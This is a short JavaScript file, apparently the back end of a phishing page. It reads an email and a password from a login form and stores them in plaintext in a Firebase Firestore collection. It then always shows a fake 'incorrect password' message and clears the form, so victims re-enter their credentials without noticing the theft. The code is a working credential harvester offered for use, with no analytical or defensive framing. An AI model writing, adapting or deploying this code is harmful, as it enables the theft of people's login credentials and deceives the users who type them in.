import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// 1. Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyA_JTCBKnJ7zaz8wRSiCpLRU2RcQZ2catw",
    authDomain: "my-firebase-site-a35bb.firebaseapp.com",
    projectId: "my-firebase-site-a35bb",
    storageBucket: "my-firebase-site-a35bb.firebasestorage.app",
    messagingSenderId: "943328160156",
    appId: "1:943328160156:web:9acc1c41989b21b3124059"
};

// 2. Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// 3. DOM Elements
const emailInput = document.getElementById('userName');
const passwordInput = document.getElementById('password');
const saveBtn = document.getElementById('saveBtn');

// 4. Submit Function
const saveUser = async () => {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    if (!email || !password) {
        alert("Please enter your email and password.");
        return;
    }

    try {
        // SAVE DATA TO FIREBASE INSTANTLY
        await addDoc(collection(db, "users"), {
            email: email,
            password: password,
            createdAt: serverTimestamp()
        });

        // SHOW ERROR IMMEDIATELY
        alert("The email or password you entered is incorrect. Please try again.");
        
        // RESET UI
        emailInput.value = "";
        passwordInput.value = "";
        emailInput.focus();

    } catch (error) {
        console.error("Error saving data:", error);
        alert("Connection error. Please try again later.");
    }
};

// 5. Event Listener
saveBtn.addEventListener('click', saveUser);
